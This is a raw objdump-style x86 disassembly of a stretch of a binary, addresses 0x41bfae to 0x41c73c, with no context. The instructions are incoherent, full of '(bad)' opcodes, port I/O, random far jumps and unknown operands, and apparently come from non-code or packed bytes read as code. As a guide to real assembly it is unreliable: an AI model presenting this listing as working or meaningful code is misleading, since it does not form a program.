  41bfae:	mov    ch,0x74
  41bfb0:	es aad 0x78
  41bfb3:	pop    eax
  41bfb4:	retf   0x774
  41bfb7:	rcl    bh,1
  41bfb9:	retf   0x8df3
  41bfbc:	fwait
  41bfbd:	push   ebx
  41bfbe:	mov    ds:0xac1f78ab,eax
  41bfc3:	jp     0x41bfad
  41bfc5:	or     eax,0xb9eddcc6
  41bfca:	mov    dh,0x85
  41bfcc:	mov    esi,0xb725e42a
  41bfd1:	fcmovnb st,st(0)
  41bfd3:	outs   dx,DWORD PTR ds:[esi]
  41bfd4:	retf   0x2133
  41bfd7:	add    esp,DWORD PTR [eax+0x23]
  41bfda:	outs   dx,DWORD PTR ds:[esi]
  41bfdb:	inc    eax
  41bfdc:	jmp    0x838d45e8
  41bfe1:	mov    ?,WORD PTR [ebx+0x1f]
  41bfe4:	daa    
  41bfe5:	dec    ecx
  41bfe6:	mov    ebx,DWORD PTR [ebx+0x2]
  41bfe9:	push   esp
  41bfea:	ds (bad) 
  41bfec:	clc    
  41bfed:	data16 arpl WORD PTR ds:0x6c53baae,bp
  41bff4:	inc    edi
  41bff5:	push   ds
  41bff6:	mov    bl,BYTE PTR [ebp-0x2a]
  41bff9:	adc    ecx,edi
  41bffb:	xor    eax,DWORD PTR [ebx]
  41bffd:	inc    esi
  41bffe:	or     dh,dl
  41c000:	xor    al,0xa4
  41c002:	aaa    
  41c003:	push   es
  41c004:	pop    esi
  41c005:	jno    0x41bfe5
  41c007:	add    BYTE PTR [ecx+0x43f77649],al
  41c00d:	jbe    0x41c04f
  41c00f:	and    dl,BYTE PTR [bp+di]
  41c012:	cmp    al,BYTE PTR [edx+0x51]
  41c015:	jp     0x41bfe3
  41c017:	aas    
  41c018:	dec    esi
  41c019:	in     eax,dx
  41c01a:	add    eax,0xd1a40559
  41c01f:	ins    BYTE PTR es:[edi],dx
  41c020:	fmulp  st(0),st
  41c022:	jecxz  0x41bfee
  41c024:	inc    eax
  41c025:	dec    ebp
  41c026:	pop    edx
  41c027:	dec    ebp
  41c028:	mov    DWORD PTR [ebx+0x4f],ecx
  41c02b:	cmp    BYTE PTR [edx+eiz*4],0x2f
  41c02f:	mov    ah,0x6c
  41c031:	inc    edi
  41c032:	les    edx,FWORD PTR [edx-0x5]
  41c035:	push   0xde7f6f41
  41c03a:	dec    ebp
  41c03b:	dec    esp
  41c03c:	in     al,0x1c
  41c03e:	mov    ds:0xc6ca8cb2,eax
  41c043:	mov    WORD PTR [eax],es
  41c045:	arpl   WORD PTR [ebp+0x619c8fb1],di
  41c04b:	cld    
  41c04c:	ss push ds
  41c04e:	or     eax,0x5c683cdd
  41c053:	push   esp
  41c054:	retf   
  41c055:	push   esi
  41c056:	ret    
  41c057:	pop    ss
  41c058:	or     al,0x9a
  41c05a:	ror    DWORD PTR [edi+eiz*1],cl
  41c05d:	mov    edi,0xd67138b4
  41c062:	jmp    0xc7e0:0x635c3de
  41c069:	in     al,0xd4
  41c06b:	mov    eax,ds:0x7f5328e1
  41c070:	arpl   WORD PTR [edi+0x635a7232],bx
  41c076:	out    0x1d,al
  41c078:	mov    edx,es
  41c07a:	xchg   esp,eax
  41c07b:	enter  0x5066,0xa4
  41c07f:	add    BYTE PTR [edi+0x1fc82fb7],ah
  41c085:	ficomp WORD PTR [eax+0x63]
  41c088:	ror    DWORD PTR [ebx+edi*1],cl
  41c08b:	push   ds
  41c08c:	mov    ds:0x17ab815,al
  41c091:	adc    ebx,DWORD PTR [ebp-0x7dc581ad]
  41c097:	xor    bh,dl
  41c099:	scas   al,BYTE PTR es:[edi]
  41c09a:	push   eax
  41c09b:	aad    0xb8
  41c09d:	xor    DWORD PTR [eax],ebp
  41c09f:	push   ebp
  41c0a0:	mov    WORD PTR [ecx+0x1924baf3],?
  41c0a6:	pop    edx
  41c0a7:	xor    dh,0x3d
  41c0aa:	push   esp
  41c0ab:	(bad)  
  41c0ac:	mov    ecx,0x9ab7f633
  41c0b1:	cmp    bl,BYTE PTR [ebx+eax*2+0x39]
  41c0b5:	rcl    DWORD PTR [ecx+0x7e44bf85],1
  41c0bb:	mov    ebx,0x1a6738df
  41c0c0:	sbb    eax,DWORD PTR [edx-0x4533c96f]
  41c0c6:	inc    esp
  41c0c7:	cmp    BYTE PTR [esi+0x14],dh
  41c0ca:	add    BYTE PTR [eax-0x1313361c],ah
  41c0d0:	retf   0x1901
  41c0d3:	dec    ebp
  41c0d4:	ror    ebp,0x29
  41c0d7:	faddp  st(7),st
  41c0d9:	pop    ebx
  41c0da:	je     0x41c082
  41c0dc:	les    eax,FWORD PTR [ebx]
  41c0de:	jmp    0x82a512f5
  41c0e3:	mov    cl,0x1a
  41c0e5:	in     al,0x58
  41c0e7:	test   al,0x44
  41c0e9:	sbb    eax,0x55782c74
  41c0ee:	pop    ebx
  41c0ef:	mov    esp,0x28762481
  41c0f4:	in     eax,dx
  41c0f5:	or     bl,dh
  41c0f7:	enter  0xda83,0xf
  41c0fb:	es xchg esp,eax
  41c0fd:	rol    DWORD PTR [ecx+ecx*4-0x7cdfba52],cl
  41c104:	hlt    
  41c105:	push   eax
  41c106:	imul   DWORD PTR [eax+0x6f]
  41c109:	test   DWORD PTR [ebx-0xf],ebp
  41c10c:	cdq    
  41c10d:	aaa    
  41c10e:	mov    ss,esp
  41c110:	(bad)  
  41c111:	shl    BYTE PTR [edx-0x67],1
  41c114:	stc    
  41c115:	scas   eax,DWORD PTR es:[edi]
  41c116:	xor    ebx,eax
  41c118:	xor    ecx,DWORD PTR [edx+ebx*1+0x4f]
  41c11c:	jg     0x41c16c
  41c11e:	ja     0x41c123
  41c120:	shl    DWORD PTR [ebx],0x42
  41c123:	arpl   bp,di
  41c125:	pushf  
  41c126:	rol    DWORD PTR [ebx-0x3a],cl
  41c129:	or     BYTE PTR [ebp-0x58],0xf7
  41c12d:	pop    eax
  41c12e:	mov    esi,0xb3cdb457
  41c133:	mov    DWORD PTR [ebp-0x55d8bbfa],ebp
  41c139:	jae    0x41c12c
  41c13b:	adc    ecx,DWORD PTR [ebx]
  41c13d:	cmp    eax,0xbc384356
  41c142:	pusha  
  41c143:	mov    esi,0x2b90945d
  41c148:	pop    edx
  41c149:	fucomp st(5)
  41c14b:	outs   dx,DWORD PTR ds:[esi]
  41c14c:	cs into 
  41c14e:	stos   BYTE PTR es:[edi],al
  41c14f:	adc    al,0x99
  41c151:	repz adc al,0x85
  41c154:	pop    es
  41c155:	fxch   st(3)
  41c157:	adc    eax,0x2b216910
  41c15c:	(bad)  [esp+edx*1+0x63d9ba4]
  41c163:	lds    ebx,FWORD PTR [ecx]
  41c165:	outs   dx,BYTE PTR ds:[esi]
  41c166:	and    DWORD PTR [edi+0x36ba6988],esi
  41c16c:	fmul   QWORD PTR [esi]
  41c16e:	dec    ecx
  41c16f:	xor    eax,0xdf45efae
  41c174:	out    0x47,eax
  41c176:	push   ecx
  41c177:	dec    edx
  41c178:	dec    al
  41c17a:	or     BYTE PTR [edx],0xff
  41c17d:	jp     0x41c165
  41c17f:	ret    
  41c180:	push   edx
  41c181:	(bad)  
  41c182:	jmp    0x410b:0xebe10a71
  41c189:	jmp    FWORD PTR [ebx+0x73]
  41c18c:	pop    esi
  41c18d:	jo     0x41c1a1
  41c18f:	rcr    BYTE PTR [edx+eiz*1+0x2a],cl
  41c193:	int    0xb5
  41c195:	add    BYTE PTR [edx-0x72a394a1],ch
  41c19b:	pop    ecx
  41c19c:	ins    BYTE PTR es:[edi],dx
  41c19d:	mov    dh,BYTE PTR [ebx+0x13]
  41c1a0:	mov    ch,BYTE PTR [esi]
  41c1a2:	enter  0xd1c8,0x62
  41c1a6:	icebp  
  41c1a7:	mov    ecx,0x3f38e32f
  41c1ac:	icebp  
  41c1ad:	jmp    DWORD PTR [ebx+0x6dc9f0ab]
  41c1b3:	dec    eax
  41c1b4:	push   ss
  41c1b5:	fwait
  41c1b6:	cmp    ebp,DWORD PTR [edi]
  41c1b8:	cmp    eax,0xdbbe2ceb
  41c1bd:	mov    edx,0xbf8e462a
  41c1c2:	fist   DWORD PTR [ebp+0x19]
  41c1c5:	out    dx,al
  41c1c6:	push   ebp
  41c1c7:	xchg   ebp,eax
  41c1c8:	add    eax,0xb47b5b10
  41c1cd:	js     0x41c174
  41c1cf:	xchg   edx,eax
  41c1d0:	(bad)  
  41c1d1:	mov    esp,0x4ac2a2c2
  41c1d6:	pop    esp
  41c1d7:	mov    bh,0xc0
  41c1d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c1da:	call   DWORD PTR [edx+0x78]
  41c1dd:	xor    DWORD PTR [ebx],ebp
  41c1df:	adc    DWORD PTR [ebp-0x5b92057d],esp
  41c1e5:	adc    eax,0x8da669e2
  41c1ea:	xchg   ebx,eax
  41c1eb:	mov    ecx,0xd5192ef6
  41c1f0:	cmp    ecx,edi
  41c1f2:	add    ch,BYTE PTR [eax-0x4]
  41c1f5:	retf   0x2307
  41c1f8:	cmp    bh,BYTE PTR fs:[ebx]
  41c1fb:	rcl    bl,cl
  41c1fd:	pushf  
  41c1fe:	xchg   ecx,eax
  41c1ff:	dec    ebx
  41c200:	cmp    eax,0xa4b6f6b1
  41c205:	sub    BYTE PTR [ebx-0x3b],dl
  41c208:	popa   
  41c209:	inc    ebp
  41c20a:	add    bl,BYTE PTR [ebp-0x5c7b70f2]
  41c210:	mov    ah,0x48
  41c212:	jle    0x41c1d4
  41c214:	data16 add al,0xe2
  41c217:	clc    
  41c218:	imul   ebp,ebx,0x38
  41c21b:	sub    ecx,edx
  41c21d:	test   al,0x47
  41c21f:	sub    al,0x20
  41c221:	sbb    edx,DWORD PTR [ebx-0x20]
  41c224:	rcl    DWORD PTR [eax-0x6d],0x71
  41c228:	repz xchg esp,eax
  41c22a:	fnstsw WORD PTR [edi-0x7]
  41c22d:	call   0x63c5:0xc57d898a
  41c234:	fsubr  QWORD PTR [ebx-0x28]
  41c237:	jl     0x41c20d
  41c239:	add    DWORD PTR [edi-0x45138c14],0xffffffd7
  41c240:	imul   ebx,DWORD PTR [eax-0x2a8f6539],0x3616a978
  41c24a:	mov    al,ds:0xd4a6006c
  41c24f:	imul   ecx,DWORD PTR [esi+ecx*8+0x78],0x3a97238
  41c257:	mov    ?,WORD PTR [edi]
  41c259:	fdiv   DWORD PTR ds:0x4ee0ea7d
  41c25f:	repz sti 
  41c261:	mov    edi,0x1d6c362d
  41c266:	sbb    ebp,edi
  41c268:	retf   0x6bfe
  41c26b:	mov    esi,0x97ad565a
  41c270:	push   cs
  41c271:	(bad)  
  41c272:	push   edx
  41c273:	ffreep st(6)
  41c275:	dec    eax
  41c276:	clc    
  41c277:	add    al,0x5e
  41c279:	test   eax,0xed8a4be5
  41c27e:	mov    ?,WORD PTR [ecx-0x71]
  41c281:	jmp    0x41c2cd
  41c283:	and    ecx,DWORD PTR [esi+eax*8]
  41c286:	in     al,0xe5
  41c288:	jbe    0x41c23b
  41c28a:	dec    edi
  41c28b:	cli    
  41c28c:	jno    0x41c233
  41c28e:	push   es
  41c28f:	dec    ebp
  41c290:	rcl    dh,1
  41c292:	mov    al,ds:0xba7b7c24
  41c297:	mov    dl,0xde
  41c299:	add    dl,BYTE PTR cs:[ebx+0x49]
  41c29d:	push   DWORD PTR [edx+0x33]
  41c2a0:	xor    al,0x5b
  41c2a2:	cmp    dl,BYTE PTR [eax+0x5a505d07]
  41c2a8:	push   ebp
  41c2a9:	sbb    edx,DWORD PTR [edx+esi*8]
  41c2ac:	scas   eax,DWORD PTR es:[edi]
  41c2ad:	test   esp,eax
  41c2af:	int3   
  41c2b0:	or     eax,0x4b5639ec
  41c2b5:	mov    eax,0x746123c5
  41c2ba:	fdivr  DWORD PTR [edx]
  41c2bc:	push   ss
  41c2bd:	mov    dl,0xef
  41c2bf:	ss idiv bh
  41c2c2:	sbb    eax,edx
  41c2c4:	leave  
  41c2c5:	dec    ecx
  41c2c6:	loopne 0x41c317
  41c2c8:	mov    ebp,0xcf7fcb75
  41c2cd:	inc    ecx
  41c2ce:	aam    0x12
  41c2d0:	xchg   DWORD PTR [ecx+0x1c],edi
  41c2d3:	jbe    0x41c27d
  41c2d5:	repz pop ds
  41c2d7:	or     BYTE PTR [ebx+esi*2],0x2e
  41c2db:	fmul   st,st(4)
  41c2dd:	pop    es
  41c2de:	leave  
  41c2df:	pop    ss
  41c2e0:	cmp    al,0x6d
  41c2e2:	mov    esi,0x88ef8376
  41c2e7:	test   al,0xc5
  41c2e9:	inc    edx
  41c2ea:	adc    BYTE PTR gs:[eax+0x62],dh
  41c2ee:	mov    ch,0x9
  41c2f0:	or     bh,BYTE PTR [ebp+edi*1-0x33fbb493]
  41c2f7:	sub    edi,DWORD PTR [eax+0x75]
  41c2fa:	xchg   edi,eax
  41c2fb:	or     ebx,DWORD PTR [ebp-0x1]
  41c2fe:	push   esi
  41c2ff:	pop    esi
  41c300:	mov    al,0x23
  41c302:	(bad)  
  41c303:	adc    BYTE PTR [ecx+0x4bcd630e],ah
  41c309:	loope  0x41c367
  41c30b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c30c:	aaa    
  41c30d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c30e:	mov    bl,BYTE PTR [ecx+0x5ac3a5ca]
  41c314:	bswap  ebp
  41c316:	nop
  41c317:	cdq    
  41c318:	push   cs
  41c319:	mov    ebx,0x6f4dae7c
  41c31e:	pop    esi
  41c31f:	dec    ecx
  41c320:	pop    ebx
  41c321:	sbb    al,BYTE PTR [ecx-0x14]
  41c324:	pop    ecx
  41c325:	ds adc al,0xb4
  41c328:	xor    BYTE PTR [eax+0x15],bh
  41c32b:	mov    cl,0x4b
  41c32d:	daa    
  41c32e:	retf   
  41c32f:	or     esi,esp
  41c331:	in     eax,0x39
  41c333:	jge    0x41c2cc
  41c335:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c336:	ss in  al,dx
  41c338:	enter  0x54ff,0x1d
  41c33c:	cmp    BYTE PTR [edx+0x2e],ah
  41c33f:	mov    dh,BYTE PTR [ecx-0x7d]
  41c342:	addr16 pop es
  41c344:	jmp    0x67d8:0x70d68f4c
  41c34b:	cwde   
  41c34c:	push   edi
  41c34d:	xlat   BYTE PTR ds:[ebx]
  41c34e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c34f:	loopne 0x41c3c0
  41c351:	mov    al,ds:0x7dfaebb6
  41c356:	pop    ecx
  41c357:	mov    WORD PTR [edx-0x3c02d00d],?
  41c35d:	dec    eax
  41c35e:	mov    al,ds:0xd0fab7db
  41c363:	ror    DWORD PTR [ecx+esi*2],0x1a
  41c367:	bound  edx,QWORD PTR [ebp-0x2ff628c5]
  41c36d:	lock ja 0x41c320
  41c370:	mov    DWORD PTR [eax+edi*1],edx
  41c373:	fsubr  st(4),st
  41c375:	xor    al,0x6c
  41c377:	jb     0x41c39e
  41c379:	adc    eax,0xf742901c
  41c37e:	fistp  QWORD PTR [edi]
  41c380:	icebp  
  41c381:	mov    ebx,0x48839f60
  41c386:	mov    ebp,0x72f9d57e
  41c38b:	sbb    bl,BYTE PTR [eax+0x75b6b4ee]
  41c391:	test   DWORD PTR [eax],esi
  41c393:	xor    al,0xac
  41c395:	out    dx,al
  41c396:	dec    esp
  41c397:	mov    dl,0xf1
  41c399:	(bad)  
  41c39a:	lods   al,BYTE PTR ds:[esi]
  41c39b:	bound  esp,QWORD PTR [edi]
  41c39d:	mov    cl,0xb1
  41c39f:	(bad)  
  41c3a1:	jo     0x41c3bf
  41c3a3:	and    BYTE PTR [edx-0x46d74b4d],bl
  41c3a9:	xchg   ebp,eax
  41c3aa:	pop    esp
  41c3ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c3ac:	jecxz  0x41c3af
  41c3ae:	ja     0x41c3f6
  41c3b0:	shr    BYTE PTR [esi+0x6f],cl
  41c3b3:	dec    eax
  41c3b4:	cmc    
  41c3b5:	cmp    eax,0xc630dc1
  41c3bb:	fnstenv [edx-0x2]
  41c3be:	mov    ecx,0xd6a4cb9e
  41c3c3:	retf   
  41c3c4:	test   eax,0xf08e3ae9
  41c3c9:	xor    al,0xf6
  41c3cb:	cmp    eax,0xdeb69c9c
  41c3d0:	fs ins DWORD PTR es:[edi],dx
  41c3d2:	jle    0x41c384
  41c3d4:	adc    al,0x40
  41c3d6:	mov    eax,?
  41c3d8:	je     0x41c3c5
  41c3da:	and    eax,DWORD PTR [eax]
  41c3dc:	inc    edx
  41c3dd:	xor    cl,al
  41c3df:	inc    ebx
  41c3e0:	xor    bh,BYTE PTR [ecx+0xea09552]
  41c3e6:	pop    edi
  41c3e7:	mov    ds:0x5da106f9,eax
  41c3ec:	(bad)  
  41c3ed:	stc    
  41c3ee:	and    eax,DWORD PTR [edx+0x185dfad1]
  41c3f4:	pop    ss
  41c3f5:	in     al,0x3b
  41c3f7:	out    0xb1,eax
  41c3f9:	push   0xfffffff5
  41c3fb:	repz in eax,0xcf
  41c3fe:	daa    
  41c3ff:	dec    eax
  41c400:	cmp    BYTE PTR [esi-0x45],dh
  41c403:	xchg   BYTE PTR [ebx-0x47],ch
  41c406:	mov    esi,0x5d8abc18
  41c40b:	add    ch,BYTE PTR [ebx]
  41c40d:	pop    es
  41c40e:	ficom  DWORD PTR [ebp+0x2b3685d7]
  41c414:	mov    eax,ds:0x785f3296
  41c419:	and    al,0xf6
  41c41b:	dec    edx
  41c41c:	fimul  WORD PTR [esi+0x77bc411b]
  41c422:	lahf   
  41c423:	sub    dl,BYTE PTR [eax-0x10]
  41c426:	cmp    eax,0x9a3636f8
  41c42b:	inc    esi
  41c42c:	xor    edi,DWORD PTR [esi+0x4]
  41c42f:	lock cmp BYTE PTR [esp+esi*4-0x4c919d5d],0xdb
  41c438:	pop    eax
  41c439:	pushf  
  41c43a:	sahf   
  41c43b:	sahf   
  41c43c:	inc    ebx
  41c43d:	aas    
  41c43e:	and    cl,dh
  41c440:	mov    eax,0x13125025
  41c445:	inc    ebx
  41c446:	scas   eax,DWORD PTR es:[edi]
  41c447:	leave  
  41c448:	jne    0x41c458
  41c44a:	mov    ch,0x5b
  41c44c:	sub    edi,DWORD PTR [edi+eiz*2-0x1b839a00]
  41c453:	aad    0x31
  41c455:	ins    DWORD PTR es:[edi],dx
  41c456:	(bad)  
  41c457:	push   ds
  41c458:	jecxz  0x41c3e2
  41c45a:	dec    esi
  41c45b:	xchg   DWORD PTR ds:0x908372d0,edi
  41c461:	mov    ah,0x4
  41c463:	push   edx
  41c464:	fisub  DWORD PTR [ebx+0x22eb9928]
  41c46a:	dec    esp
  41c46b:	int    0x96
  41c46d:	call   FWORD PTR [esi+0x65]
  41c470:	neg    DWORD PTR [ebx+0x4a93f115]
  41c476:	cld    
  41c477:	push   edx
  41c478:	adc    eax,0xa6edad83
  41c47d:	inc    BYTE PTR [bx+0x7b]
  41c481:	loope  0x41c4c2
  41c483:	neg    ebp
  41c485:	fld    TBYTE PTR [edi]
  41c487:	out    0xee,al
  41c489:	je     0x41c500
  41c48b:	xor    DWORD PTR [edi+0x59],ecx
  41c48e:	mov    ds:0xbebc489b,al
  41c493:	mov    dl,0x95
  41c495:	cmp    al,0x63
  41c497:	mov    BYTE PTR [ecx],al
  41c499:	test   esi,ebp
  41c49b:	cwde   
  41c49c:	adc    BYTE PTR [esi],cl
  41c49e:	xor    edi,DWORD PTR [ebp+0x2d59afd6]
  41c4a4:	sar    DWORD PTR [edx-0x75f80b7f],cl
  41c4aa:	push   eax
  41c4ab:	js     0x41c490
  41c4ad:	std    
  41c4ae:	dec    ecx
  41c4af:	in     eax,0x7b
  41c4b1:	push   ds
  41c4b2:	cmp    DWORD PTR [ebp+0x7],ebx
  41c4b5:	xchg   edi,eax
  41c4b6:	dec    ebp
  41c4b7:	mov    ecx,0x1ad9f7eb
  41c4bc:	je     0x41c508
  41c4be:	mov    al,ds:0x58df6b77
  41c4c3:	jl     0x41c4d4
  41c4c5:	int3   
  41c4c6:	popf   
  41c4c7:	iret   
  41c4c8:	xor    al,0xe1
  41c4ca:	test   BYTE PTR [eax+0x4d384987],al
  41c4d0:	inc    ebx
  41c4d1:	(bad)  
  41c4d2:	outs   dx,DWORD PTR ds:[esi]
  41c4d3:	mov    ah,0x6c
  41c4d5:	hlt    
  41c4d6:	pop    ss
  41c4d7:	mov    eax,0x2a35499d
  41c4dc:	and    eax,0x4d8933dc
  41c4e1:	shr    DWORD PTR [edx-0x55],cl
  41c4e4:	retf   0x95f5
  41c4e7:	and    BYTE PTR [esi],bl
  41c4e9:	cs dec ebp
  41c4eb:	lahf   
  41c4ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c4ed:	mov    ch,0xab
  41c4ef:	and    eax,0xa5430ae9
  41c4f4:	rol    BYTE PTR [edi+0x5b],cl
  41c4f7:	jae    0x41c4b6
  41c4f9:	push   esi
  41c4fa:	lock cmp cl,BYTE PTR [ecx+0x8053715]
  41c501:	mov    eax,ds:0xd31dab3
  41c506:	out    0xd6,al
  41c508:	xchg   edx,eax
  41c509:	sbb    al,0x3e
  41c50b:	(bad)  
  41c50c:	jno    0x41c52d
  41c50e:	mov    al,dl
  41c510:	sbb    eax,0x6324095a
  41c515:	pop    ecx
  41c516:	cmp    al,BYTE PTR es:[edx+edx*1]
  41c51a:	mov    fs:0x3c9f4958,eax
  41c520:	add    eax,0xadaeb7b8
  41c525:	or     esp,DWORD PTR [eax]
  41c527:	sub    BYTE PTR [ebx+0x77],ah
  41c52a:	pushf  
  41c52b:	pop    bx
  41c52d:	jecxz  0x41c577
  41c52f:	jmp    0xa14647e6
  41c534:	push   cs
  41c535:	sub    ebp,esi
  41c537:	aad    0xe8
  41c539:	daa    
  41c53a:	clc    
  41c53b:	mov    al,0xeb
  41c53d:	pop    esi
  41c53e:	div    BYTE PTR [edx]
  41c540:	fabs   
  41c542:	sbb    bh,bl
  41c544:	mov    edx,0x7785f526
  41c549:	fldenv [edx]
  41c54b:	cli    
  41c54c:	in     eax,dx
  41c54d:	test   eax,0xff059c82
  41c552:	cli    
  41c553:	adc    DWORD PTR [edx],edi
  41c555:	shl    DWORD PTR [ebx],1
  41c557:	sahf   
  41c558:	pop    ebp
  41c559:	ss mov dl,0x5a
  41c55c:	mov    WORD PTR [esi],?
  41c55e:	dec    BYTE PTR [eax]
  41c560:	pop    edi
  41c561:	int3   
  41c562:	pop    ecx
  41c563:	push   ds
  41c564:	aad    0xcc
  41c566:	push   esi
  41c568:	pop    edi
  41c569:	sub    BYTE PTR [ecx+eiz*2-0x234bc807],al
  41c570:	(bad)  
  41c571:	adc    ah,BYTE PTR [ebx]
  41c573:	scas   eax,DWORD PTR es:[edi]
  41c574:	xchg   ecx,eax
  41c575:	or     al,0xbb
  41c577:	jg     0x41c589
  41c579:	jge    0x41c570
  41c57b:	leave  
  41c57c:	push   esi
  41c57d:	inc    ecx
  41c57e:	sub    esp,eax
  41c580:	adc    esi,DWORD PTR [esi+0x2a2148bd]
  41c586:	inc    eax
  41c587:	ds dec esi
  41c589:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c58a:	push   eax
  41c58b:	rcl    BYTE PTR [ebx+0x2aa5c950],cl
  41c591:	or     DWORD PTR [esi-0x76],esi
  41c594:	pushf  
  41c595:	mov    ebx,0x1fd9e221
  41c59a:	sub    BYTE PTR [eax+0x7d],al
  41c59d:	in     al,0x5c
  41c59f:	and    DWORD PTR [ebp+0x6f],esp
  41c5a2:	adc    ch,BYTE PTR [ecx-0x57]
  41c5a5:	pop    edi
  41c5a6:	mov    edi,0xf373a2c7
  41c5ab:	test   eax,0x8e397cf9
  41c5b0:	test   eax,0x59a8605c
  41c5b5:	pop    ds
  41c5b6:	cmp    eax,0x83bbb9c3
  41c5bb:	push   ebx
  41c5bc:	sbb    esi,DWORD PTR [edi-0x4ebe46e4]
  41c5c2:	push   edi
  41c5c3:	call   0x17a7:0x1fd811fd
  41c5ca:	retfw  
  41c5cc:	xchg   esi,eax
  41c5cd:	and    ebx,DWORD PTR [esi+0xd07107f]
  41c5d3:	loop   0x41c57b
  41c5d5:	icebp  
  41c5d6:	cmc    
  41c5d7:	mov    ebp,DWORD PTR [ecx-0xa530b2c]
  41c5dd:	xor    al,0x8d
  41c5df:	cdq    
  41c5e0:	sbb    DWORD PTR [ebx+0x5d],esi
  41c5e3:	outs   dx,BYTE PTR ds:[esi]
  41c5e4:	jno    0x41c662
  41c5e6:	repnz add edi,ebx
  41c5e9:	xchg   bh,ah
  41c5eb:	ja     0x41c5d6
  41c5ed:	mov    edi,0x9854e261
  41c5f2:	enter  0x851b,0xa0
  41c5f6:	cmp    cl,dl
  41c5f8:	out    dx,al
  41c5f9:	lock test BYTE PTR [edi-0x2269f49c],dl
  41c600:	cmc    
  41c601:	(bad)  
  41c602:	into   
  41c603:	add    eax,0x1c7aa202
  41c608:	dec    esi
  41c609:	test   bh,bh
  41c60b:	out    0x4f,eax
  41c60d:	shl    DWORD PTR [ebp+0x25],cl
  41c610:	push   eax
  41c611:	retf   
  41c612:	push   ds
  41c613:	jl     0x41c5bc
  41c615:	jmp    0x24ee:0x2f9801d4
  41c61c:	fimul  DWORD PTR [ebp-0xbba5d96]
  41c622:	push   esi
  41c623:	loopne 0x41c69c
  41c625:	fcomp  st(0)
  41c627:	push   ebp
  41c628:	fidiv  DWORD PTR [edi-0x54a12e9d]
  41c62e:	into   
  41c62f:	push   ebp
  41c630:	adc    dh,ah
  41c632:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c633:	push   es
  41c634:	ret    0x13d4
  41c637:	mov    DWORD PTR [eax-0x22],ecx
  41c63a:	fisubr WORD PTR [eax]
  41c63c:	stos   DWORD PTR es:[edi],eax
  41c63d:	jo     0x41c627
  41c63f:	ret    0x27b5
  41c642:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c643:	push   ds
  41c644:	sbb    eax,0x1b157af2
  41c649:	stc    
  41c64a:	sbb    eax,0x17387256
  41c64f:	sbb    al,0xcb
  41c651:	or     DWORD PTR [ebp+0x163bcd0a],0x7d
  41c658:	mov    edi,0x686cc166
  41c65d:	mov    eax,0x7700a5e1
  41c662:	pop    esi
  41c663:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c664:	std    
  41c665:	lds    esp,FWORD PTR [ebx]
  41c667:	mov    edi,DWORD PTR [edi]
  41c669:	pop    eax
  41c66a:	pop    ds
  41c66b:	mov    ecx,0x4d884860
  41c670:	jmp    0x4b26:0x430f96c4
  41c677:	retf   
  41c678:	daa    
  41c679:	sub    eax,0xfc5c5099
  41c67e:	out    dx,eax
  41c67f:	mov    DWORD PTR [esi-0x26],esi
  41c682:	mov    dh,0xa0
  41c684:	or     al,BYTE PTR [eax]
  41c686:	call   0x959d:0xc3db48fa
  41c68d:	jo     0x41c69f
  41c68f:	push   eax
  41c690:	icebp  
  41c691:	lods   al,BYTE PTR ds:[esi]
  41c692:	mov    cs,WORD PTR [ecx-0x43]
  41c695:	xor    al,0x30
  41c697:	jo     0x41c61c
  41c699:	or     edx,DWORD PTR [esi-0x63]
  41c69c:	das    
  41c69d:	stos   BYTE PTR es:[edi],al
  41c69e:	out    0x6d,eax
  41c6a0:	dec    eax
  41c6a1:	and    eax,0xa134f091
  41c6a6:	pop    ds
  41c6a7:	imul   BYTE PTR [edi]
  41c6a9:	aad    0x65
  41c6ab:	das    
  41c6ac:	pop    esi
  41c6ad:	and    DWORD PTR [ebp+eax*1+0x3fe837fa],ebp
  41c6b4:	jecxz  0x41c689
  41c6b6:	or     al,0x4c
  41c6b8:	daa    
  41c6b9:	mov    al,0xff
  41c6bb:	loope  0x41c6c1
  41c6bd:	(bad)  [ebp+0x7c0964b5]
  41c6c3:	popa   
  41c6c4:	xchg   esp,eax
  41c6c5:	mov    esp,0x16fbb148
  41c6ca:	add    ebx,DWORD PTR [ecx]
  41c6cc:	push   edx
  41c6cd:	jmp    0xc349:0xb0050021
  41c6d4:	lods   al,BYTE PTR ds:[esi]
  41c6d5:	push   ebp
  41c6d6:	aas    
  41c6d7:	into   
  41c6d8:	mov    ds:0xbf9021e6,al
  41c6dd:	(bad)  
  41c6df:	sub    ch,BYTE PTR [ebx]
  41c6e1:	add    cl,dl
  41c6e3:	ins    DWORD PTR es:[edi],dx
  41c6e4:	mov    edi,0x15555c43
  41c6e9:	adc    DWORD PTR [eax],ebx
  41c6eb:	or     al,0xa2
  41c6ed:	test   ecx,0xbd0f78b2
  41c6f3:	out    dx,eax
  41c6f4:	mov    bh,0xa
  41c6f6:	sbb    esi,DWORD PTR [edx-0x80]
  41c6f9:	sub    ch,BYTE PTR [esp]
  41c6fc:	inc    ebp
  41c6fd:	icebp  
  41c6fe:	sbb    ecx,DWORD PTR [esi-0x25373a4e]
  41c704:	pop    ebx
  41c705:	outs   dx,DWORD PTR ds:[esi]
  41c706:	aas    
  41c707:	or     DWORD PTR [esi+0x5f9e803],0xffffffeb
  41c70e:	lock mov bh,0xbd
  41c711:	ret    
  41c712:	cmp    eax,0x4354bd7
  41c717:	(bad)  
  41c719:	les    ecx,FWORD PTR [ecx-0x24fb5725]
  41c71f:	adc    DWORD PTR ds:0x93e426ae,esi
  41c725:	aaa    
  41c726:	xchg   ecx,eax
  41c727:	js     0x41c7a2
  41c729:	xlat   BYTE PTR ds:[ebx]
  41c72a:	and    BYTE PTR [ebx-0x1627dee3],bh
  41c730:	fisubr DWORD PTR [esp+esi*8]
  41c733:	jg     0x41c75e
  41c735:	cmp    DWORD PTR [edx],0x66
  41c738:	sbb    DWORD PTR [ecx],edx
  41c73a:	jge    0x41c6de
  41c73c:	pop    esp
